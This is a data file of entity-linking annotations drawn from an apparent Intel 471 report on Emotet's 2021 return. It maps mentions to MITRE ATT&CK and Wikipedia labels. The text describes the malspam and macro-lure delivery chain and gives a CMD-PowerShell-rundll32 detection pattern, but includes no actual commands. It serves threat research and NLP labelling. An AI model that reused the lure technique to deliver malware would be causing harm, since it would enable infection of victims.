{"mention": "emails are fairly simple, consisting of an attached compressed (.zip) file", "context_left": "While Intel 471 Malware Intelligence systems were unable to collect any malspam from Emotet, open source intelligence (OSINT) spam samples pulled from various sources, including the VirusTotal intelligence platform, demonstrate the spam templates used. Emotet", "context_right": "and password used to open the file. ![Image 1 email lure]()", "_context_left": "Emotet ", "_context_right": " and password used to open the file.", "sentence_left": "While Intel 471 Malware Intelligence systems were unable to collect any malspam from Emotet, open source intelligence (OSINT) spam samples pulled from various sources, including the VirusTotal intelligence platform, demonstrate the spam templates used.", "sentence_right": "![Image 1 email lure]()", "label": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns. Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source.", "label_id": 161, "label_title": "Phishing", "label_link": "https://attack.mitre.org/techniques/T1566", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "![Image 1 email lure]() The image depicts an", "context_right": "email lure. While the found lure was in the Spanish language, senders and receivers were spread worldwide, leading to nearly global targeting.", "_context_left": "The image depicts an ", "_context_right": " email lure.", "sentence_left": "![Image 1 email lure]()", "sentence_right": "While the found lure was in the Spanish language, senders and receivers were spread worldwide, leading to nearly global targeting.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Microsoft", "context_left": "While the found lure was in the Spanish language, senders and receivers were spread worldwide, leading to nearly global targeting. The encrypted .zip file contained a malicious", "context_right": "Word document (maldoc) used to download and install the Emotet loader. Upon opening Emotet maldocs, victims are greeted with fake Microsoft 365 prompt that states “THIS DOCUMENT IS PROTECTED,” and instructs victims on how to enable macros.", "_context_left": "The encrypted .zip file contained a malicious ", "_context_right": " Word document (maldoc) used to download and install the Emotet loader.", "sentence_left": "While the found lure was in the Spanish language, senders and receivers were spread worldwide, leading to nearly global targeting.", "sentence_right": "Upon opening Emotet maldocs, victims are greeted with fake Microsoft 365 prompt that states “THIS DOCUMENT IS PROTECTED,” and instructs victims on how to enable macros.", "label": "Microsoft Corporation is an American multinational technology company with headquarters in Redmond, Washington. It develops, manufactures, licenses, supports and sells computer software, consumer electronics, personal computers, and related services. Its best known software products are the Microsoft Windows line of operating systems, the Microsoft Office suite, and the Internet Explorer and Edge Web browsers. Its flagship hardware products are the Xbox video game consoles and the Microsoft Surface lineup of touchscreen personal computers. As of 2016, it is the world's largest software maker by revenue, and one of the world's most valuable companies. The word \"Microsoft\" is a portmanteau of \"microcomputer\" and \"software\". Microsoft is ranked No. 30 in the 2018 Fortune 500 rankings of the largest United States corporations by total revenue.  Microsoft was founded by Bill Gates and Paul Allen on April 4, 1975, to develop and sell BASIC interpreters for the Altair 8800. It rose to dominate the personal computer operating system market with MS-DOS in the mid-1980s, followed by Microsoft Windows. The company's 1986 initial public offering (IPO), and subsequent rise in its share price, created three billionaires and an estimated 12,000 millionaires among Microsoft employees. Since the 1990s, it has increasingly diversified from the operating system market and has made a number of corporate acquisitions, their largest being the acquisition of LinkedIn for $26.2 billion in December 2016, followed by their acquisition of Skype Technologies for $8.5 billion in May 2011.  , Microsoft is market-dominant in the IBM PC compatible operating system market and the office software suite", "label_id": 9231, "label_title": "Microsoft", "label_link": "https://en.wikipedia.org/wiki?curid=19001", "entity_class": "NE", "entity_type": "ORG", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "While the found lure was in the Spanish language, senders and receivers were spread worldwide, leading to nearly global targeting. The encrypted .zip file contained a malicious Microsoft Word document (maldoc) used to download and install the", "context_right": "loader. Upon opening Emotet maldocs, victims are greeted with fake Microsoft 365 prompt that states “THIS DOCUMENT IS PROTECTED,” and instructs victims on how to enable macros.", "_context_left": "The encrypted .zip file contained a malicious Microsoft Word document (maldoc) used to download and install the ", "_context_right": " loader.", "sentence_left": "While the found lure was in the Spanish language, senders and receivers were spread worldwide, leading to nearly global targeting.", "sentence_right": "Upon opening Emotet maldocs, victims are greeted with fake Microsoft 365 prompt that states “THIS DOCUMENT IS PROTECTED,” and instructs victims on how to enable macros.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "malicious Microsoft Word document (maldoc) used to download and install the Emotet loader", "context_left": "While the found lure was in the Spanish language, senders and receivers were spread worldwide, leading to nearly global targeting. The encrypted .zip file contained a", "context_right": ". Upon opening Emotet maldocs, victims are greeted with fake Microsoft 365 prompt that states “THIS DOCUMENT IS PROTECTED,” and instructs victims on how to enable macros.", "_context_left": "The encrypted .zip file contained a ", "_context_right": ".", "sentence_left": "While the found lure was in the Spanish language, senders and receivers were spread worldwide, leading to nearly global targeting.", "sentence_right": "Upon opening Emotet maldocs, victims are greeted with fake Microsoft 365 prompt that states “THIS DOCUMENT IS PROTECTED,” and instructs victims on how to enable macros.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Microsoft", "context_left": "The encrypted .zip file contained a malicious Microsoft Word document (maldoc) used to download and install the Emotet loader. Upon opening Emotet maldocs, victims are greeted with fake", "context_right": "365 prompt that states “THIS DOCUMENT IS PROTECTED,” and instructs victims on how to enable macros. ![Image 2 the lure]()", "_context_left": "Upon opening Emotet maldocs, victims are greeted with fake ", "_context_right": " 365 prompt that states “THIS DOCUMENT IS PROTECTED,” and instructs victims on how to enable macros.", "sentence_left": "The encrypted .zip file contained a malicious Microsoft Word document (maldoc) used to download and install the Emotet loader.", "sentence_right": "![Image 2 the lure]()", "label": "Microsoft Corporation is an American multinational technology company with headquarters in Redmond, Washington. It develops, manufactures, licenses, supports and sells computer software, consumer electronics, personal computers, and related services. Its best known software products are the Microsoft Windows line of operating systems, the Microsoft Office suite, and the Internet Explorer and Edge Web browsers. Its flagship hardware products are the Xbox video game consoles and the Microsoft Surface lineup of touchscreen personal computers. As of 2016, it is the world's largest software maker by revenue, and one of the world's most valuable companies. The word \"Microsoft\" is a portmanteau of \"microcomputer\" and \"software\". Microsoft is ranked No. 30 in the 2018 Fortune 500 rankings of the largest United States corporations by total revenue.  Microsoft was founded by Bill Gates and Paul Allen on April 4, 1975, to develop and sell BASIC interpreters for the Altair 8800. It rose to dominate the personal computer operating system market with MS-DOS in the mid-1980s, followed by Microsoft Windows. The company's 1986 initial public offering (IPO), and subsequent rise in its share price, created three billionaires and an estimated 12,000 millionaires among Microsoft employees. Since the 1990s, it has increasingly diversified from the operating system market and has made a number of corporate acquisitions, their largest being the acquisition of LinkedIn for $26.2 billion in December 2016, followed by their acquisition of Skype Technologies for $8.5 billion in May 2011.  , Microsoft is market-dominant in the IBM PC compatible operating system market and the office software suite", "label_id": 9231, "label_title": "Microsoft", "label_link": "https://en.wikipedia.org/wiki?curid=19001", "entity_class": "NE", "entity_type": "ORG", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "The encrypted .zip file contained a malicious Microsoft Word document (maldoc) used to download and install the Emotet loader. Upon opening", "context_right": "maldocs, victims are greeted with fake Microsoft 365 prompt that states “THIS DOCUMENT IS PROTECTED,” and instructs victims on how to enable macros. ![Image 2 the lure]()", "_context_left": "Upon opening ", "_context_right": " maldocs, victims are greeted with fake Microsoft 365 prompt that states “THIS DOCUMENT IS PROTECTED,” and instructs victims on how to enable macros.", "sentence_left": "The encrypted .zip file contained a malicious Microsoft Word document (maldoc) used to download and install the Emotet loader.", "sentence_right": "![Image 2 the lure]()", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "opening Emotet maldocs", "context_left": "The encrypted .zip file contained a malicious Microsoft Word document (maldoc) used to download and install the Emotet loader. Upon", "context_right": ", victims are greeted with fake Microsoft 365 prompt that states “THIS DOCUMENT IS PROTECTED,” and instructs victims on how to enable macros. ![Image 2 the lure]()", "_context_left": "Upon ", "_context_right": ", victims are greeted with fake Microsoft 365 prompt that states “THIS DOCUMENT IS PROTECTED,” and instructs victims on how to enable macros.", "sentence_left": "The encrypted .zip file contained a malicious Microsoft Word document (maldoc) used to download and install the Emotet loader.", "sentence_right": "![Image 2 the lure]()", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "instructs victims on how to enable macros.", "context_left": "The encrypted .zip file contained a malicious Microsoft Word document (maldoc) used to download and install the Emotet loader. Upon opening Emotet maldocs, victims are greeted with fake Microsoft 365 prompt that states “THIS DOCUMENT IS PROTECTED,” and", "context_right": "![Image 2 the lure]()", "_context_left": "Upon opening Emotet maldocs, victims are greeted with fake Microsoft 365 prompt that states “THIS DOCUMENT IS PROTECTED,” and ", "_context_right": "", "sentence_left": "The encrypted .zip file contained a malicious Microsoft Word document (maldoc) used to download and install the Emotet loader.", "sentence_right": "![Image 2 the lure]()", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "![Image 2 the lure]() The image depicts an", "context_right": "document lure. Enabling macros will allow the document to spawn PowerShell and attempt to download and execute the Emotet loader.", "_context_left": "The image depicts an ", "_context_right": " document lure.", "sentence_left": "![Image 2 the lure]()", "sentence_right": "Enabling macros will allow the document to spawn PowerShell and attempt to download and execute the Emotet loader.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "The image depicts an Emotet document lure. Enabling macros will allow the document to spawn PowerShell and attempt to download and execute the", "context_right": "loader. The document uses at least five different distribution lures typically to ensure reliability and uptime for loader distribution.", "_context_left": "Enabling macros will allow the document to spawn PowerShell and attempt to download and execute the ", "_context_right": " loader.", "sentence_left": "The image depicts an Emotet document lure.", "sentence_right": "The document uses at least five different distribution lures typically to ensure reliability and uptime for loader distribution.", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Enabling macros", "context_left": "The image depicts an Emotet document lure.", "context_right": "will allow the document to spawn PowerShell and attempt to download and execute the Emotet loader. The document uses at least five different distribution lures typically to ensure reliability and uptime for loader distribution.", "_context_left": "", "_context_right": " will allow the document to spawn PowerShell and attempt to download and execute the Emotet loader.", "sentence_left": "The image depicts an Emotet document lure.", "sentence_right": "The document uses at least five different distribution lures typically to ensure reliability and uptime for loader distribution.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "will allow the document to spawn PowerShell", "context_left": "The image depicts an Emotet document lure. Enabling macros", "context_right": "and attempt to download and execute the Emotet loader. The document uses at least five different distribution lures typically to ensure reliability and uptime for loader distribution.", "_context_left": "Enabling macros ", "_context_right": " and attempt to download and execute the Emotet loader.", "sentence_left": "The image depicts an Emotet document lure.", "sentence_right": "The document uses at least five different distribution lures typically to ensure reliability and uptime for loader distribution.", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "document uses at least five different distribution lures", "context_left": "Enabling macros will allow the document to spawn PowerShell and attempt to download and execute the Emotet loader. The", "context_right": "typically to ensure reliability and uptime for loader distribution. The document uses the following commands to spawn PowerShell and attempt to download and execute the malware:", "_context_left": "The ", "_context_right": " typically to ensure reliability and uptime for loader distribution.", "sentence_left": "Enabling macros will allow the document to spawn PowerShell and attempt to download and execute the Emotet loader.", "sentence_right": "The document uses the following commands to spawn PowerShell and attempt to download and execute the malware:", "label": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns. Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source.", "label_id": 161, "label_title": "Phishing", "label_link": "https://attack.mitre.org/techniques/T1566", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "malware", "context_left": "The document uses at least five different distribution lures typically to ensure reliability and uptime for loader distribution. The document uses the following commands to spawn PowerShell and attempt to download and execute the", "context_right": ": * ```", "_context_left": "The document uses the following commands to spawn PowerShell and attempt to download and execute the ", "_context_right": ":", "sentence_left": "The document uses at least five different distribution lures typically to ensure reliability and uptime for loader distribution.", "sentence_right": "* ```", "label": "Malware (a portmanteau for malicious software) is any software intentionally designed to cause damage to a computer, server, client, or computer network. Malware does the damage after it is implanted or introduced in some way into a target's computer and can take the form of executable code, scripts, active content, and other software. The code is described as computer viruses, worms, Trojan horses, ransomware, spyware, adware, and scareware, among other terms. Malware has a malicious intent, acting against the interest of the computer user—and so does not include software that causes unintentional harm due to some deficiency, which is typically described as a software bug.  Programs officially supplied by companies can be considered malware if they secretly act against the interests of the computer user. For example, at one point Sony music Compact discs silently installed a rootkit on purchasers' computers with the intention of preventing illicit copying; but which also reported on users' listening habits, and unintentionally created extra security vulnerabilities.  One strategy for protecting against malware is to prevent the harmful software from gaining access to the target computer. For this reason, antivirus software, firewalls and other strategies are used to help protect against the introduction of malware, in addition to checking for the presence of malware and malicious activity and recovering from attacks.", "label_id": 10247, "label_title": "Malware", "label_link": "https://en.wikipedia.org/wiki?curid=20901", "entity_class": "CE", "entity_type": "CON", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "document uses the following commands", "context_left": "The document uses at least five different distribution lures typically to ensure reliability and uptime for loader distribution. The", "context_right": "to spawn PowerShell and attempt to download and execute the malware: * ```", "_context_left": "The ", "_context_right": " to spawn PowerShell and attempt to download and execute the malware:", "sentence_left": "The document uses at least five different distribution lures typically to ensure reliability and uptime for loader distribution.", "sentence_right": "* ```", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "PowerShell and attempt to download and execute the malware", "context_left": "The document uses at least five different distribution lures typically to ensure reliability and uptime for loader distribution. The document uses the following commands to spawn", "context_right": ": * ```", "_context_left": "The document uses the following commands to spawn ", "_context_right": ":", "sentence_left": "The document uses at least five different distribution lures typically to ensure reliability and uptime for loader distribution.", "sentence_right": "* ```", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Microsoft", "context_left": "``` Defenders should look for", "context_right": "Word or Excel sheets that spawn `CMD -> PowerShell -> rundll32[.]exe` to identify Emotet activity. **What we learned**", "_context_left": "Defenders should look for ", "_context_right": " Word or Excel sheets that spawn `CMD -> PowerShell -> rundll32[.]exe` to identify Emotet activity.", "sentence_left": "```", "sentence_right": "**What we learned**", "label": "Microsoft Corporation is an American multinational technology company with headquarters in Redmond, Washington. It develops, manufactures, licenses, supports and sells computer software, consumer electronics, personal computers, and related services. Its best known software products are the Microsoft Windows line of operating systems, the Microsoft Office suite, and the Internet Explorer and Edge Web browsers. Its flagship hardware products are the Xbox video game consoles and the Microsoft Surface lineup of touchscreen personal computers. As of 2016, it is the world's largest software maker by revenue, and one of the world's most valuable companies. The word \"Microsoft\" is a portmanteau of \"microcomputer\" and \"software\". Microsoft is ranked No. 30 in the 2018 Fortune 500 rankings of the largest United States corporations by total revenue.  Microsoft was founded by Bill Gates and Paul Allen on April 4, 1975, to develop and sell BASIC interpreters for the Altair 8800. It rose to dominate the personal computer operating system market with MS-DOS in the mid-1980s, followed by Microsoft Windows. The company's 1986 initial public offering (IPO), and subsequent rise in its share price, created three billionaires and an estimated 12,000 millionaires among Microsoft employees. Since the 1990s, it has increasingly diversified from the operating system market and has made a number of corporate acquisitions, their largest being the acquisition of LinkedIn for $26.2 billion in December 2016, followed by their acquisition of Skype Technologies for $8.5 billion in May 2011.  , Microsoft is market-dominant in the IBM PC compatible operating system market and the office software suite", "label_id": 9231, "label_title": "Microsoft", "label_link": "https://en.wikipedia.org/wiki?curid=19001", "entity_class": "NE", "entity_type": "ORG", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "PowerShell", "context_left": "``` Defenders should look for Microsoft Word or Excel sheets that spawn `CMD ->", "context_right": "-> rundll32[.]exe` to identify Emotet activity. **What we learned**", "_context_left": "Defenders should look for Microsoft Word or Excel sheets that spawn `CMD -> ", "_context_right": " -> rundll32[.]exe` to identify Emotet activity.", "sentence_left": "```", "sentence_right": "**What we learned**", "label": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005). Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)", "label_id": 368, "label_title": "Command and Scripting Interpreter", "label_link": "https://attack.mitre.org/techniques/T1059", "entity_class": "CE", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "Emotet", "context_left": "``` Defenders should look for Microsoft Word or Excel sheets that spawn `CMD -> PowerShell -> rundll32[.]exe` to identify", "context_right": "activity. **What we learned**", "_context_left": "Defenders should look for Microsoft Word or Excel sheets that spawn `CMD -> PowerShell -> rundll32[.]exe` to identify ", "_context_right": " activity.", "sentence_left": "```", "sentence_right": "**What we learned**", "label": "[Emotet](https://attack.mitre.org/software/S0367) is a modular malware variant which is primarily used as a downloader for other malware variants such as [TrickBot](https://attack.mitre.org/software/S0266) and [IcedID](https://attack.mitre.org/software/S0483). Emotet first emerged in June 2014 and has been primarily used to target the banking sector. (Citation: Trend Micro Banking Malware Jan 2019)", "label_id": 944, "label_title": "Emotet", "label_link": "https://attack.mitre.org/software/S0367", "entity_class": "CE", "entity_type": "MALWARE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
